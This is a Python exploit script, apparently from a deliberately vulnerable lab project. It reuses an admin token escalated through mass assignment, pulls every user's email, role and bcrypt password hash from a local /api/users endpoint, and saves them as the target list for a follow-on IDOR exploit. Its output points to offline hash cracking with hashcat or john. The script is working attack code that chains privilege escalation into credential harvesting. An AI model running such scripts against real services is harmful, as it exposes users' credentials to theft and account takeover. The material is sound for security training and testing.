#!/usr/bin/env python3
"""
data_exposure.py — VULN-01: Excessive Data Exposure

getUsers in userController.js was originally written as:
    User.find().select("-password")
The .select("-password") was deliberately removed in Phase 05, meaning
GET /api/users now returns every user's full document from MongoDB —
including the bcrypt password hash.

This is a serious finding even though the hashes aren't plaintext:
  - Hashes can be cracked offline (no rate-limiting, no lockout — the
    attacker controls the pace entirely).
  - Knowing a hash allows an attacker to verify a guessed password
    without touching the server at all.
  - The hash format ($2b$10$...) also leaks the bcrypt cost factor,
    telling the attacker exactly how fast/slow offline cracking will be.

This script chains directly from mass_assignment.py:
  1. Loads the escalated admin session from escalated_admin_account.json.
  2. Calls GET /api/users with that admin token.
  3. Displays every user's id, username, email, role, and password hash.
  4. Saves the full user list to discovered_users.json for exploit_idor.py.

Usage:
    python data_exposure.py
"""

import json
import os
import sys

import requests

DEFAULT_BASE_URL = "http://localhost:5001"
GET_USERS_PATH = "/api/users"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ESCALATED_ACCOUNT_FILE = os.path.join(SCRIPT_DIR, "escalated_admin_account.json")
DISCOVERED_USERS_FILE = os.path.join(SCRIPT_DIR, "discovered_users.json")


def load_admin_session() -> dict:
    if not os.path.exists(ESCALATED_ACCOUNT_FILE):
        print(f"[!] {ESCALATED_ACCOUNT_FILE} not found.", file=sys.stderr)
        print("    Run mass_assignment.py first to escalate an account to admin.",
              file=sys.stderr)
        sys.exit(1)
    with open(ESCALATED_ACCOUNT_FILE) as f:
        return json.load(f)


def run(base_url: str = DEFAULT_BASE_URL):
    session = load_admin_session()
    token = session["token"]
    email = session["email"]

    url = base_url.rstrip("/") + GET_USERS_PATH
    print(f"[*] Using escalated admin account: {email}")
    print(f"[*] Calling GET {url}")

    resp = requests.get(
        url,
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )

    print(f"[*] Response: HTTP {resp.status_code}\n")

    if resp.status_code != 200:
        print(f"[!] Request failed: {resp.text}", file=sys.stderr)
        sys.exit(1)

    users = resp.json()

    # -----------------------------------------------------------------------
    # Print findings
    # -----------------------------------------------------------------------
    print(f"[+] {len(users)} user account(s) returned by the API:\n")
    print(f"  {'#':<4} {'username':<20} {'email':<35} {'role':<10} password hash")
    print(f"  {'-'*4} {'-'*20} {'-'*35} {'-'*10} {'-'*60}")

    has_hashes = False
    for i, user in enumerate(users, 1):
        pw = user.get("password", "")
        hash_display = pw if pw else "(not returned)"
        if pw:
            has_hashes = True
        print(f"  {i:<4} {user.get('username',''):<20} "
              f"{user.get('email',''):<35} "
              f"{user.get('role',''):<10} "
              f"{hash_display}")

    print()
    if has_hashes:
        print("[+] VULNERABILITY CONFIRMED: bcrypt password hashes exposed in API response.")
        print("    These hashes can be attacked offline using tools such as hashcat")
        print("    or john, with no rate-limiting or lockout since the target server")
        print("    is not involved in offline cracking at all.")
        print()
        print("    Hash format observed: bcrypt ($2b$10$...) — cost factor 10.")
        print("    Offline cracking throughput on modern GPU hardware: ~10,000-")
        print("    100,000 guesses/second (vs ~110 req/s when hitting the live")
        print("    endpoint), making offline cracking orders of magnitude faster.")
    else:
        print("[!] No password hashes observed in response — the vulnerability")
        print("    may have been patched, or the response shape is unexpected.")

    # -----------------------------------------------------------------------
    # Save for exploit_idor.py
    # -----------------------------------------------------------------------
    with open(DISCOVERED_USERS_FILE, "w") as f:
        json.dump(users, f, indent=2)

    print(f"\n[*] Full user list saved to {DISCOVERED_USERS_FILE}")
    print("    exploit_idor.py will use this as its target list.")


if __name__ == "__main__":
    run()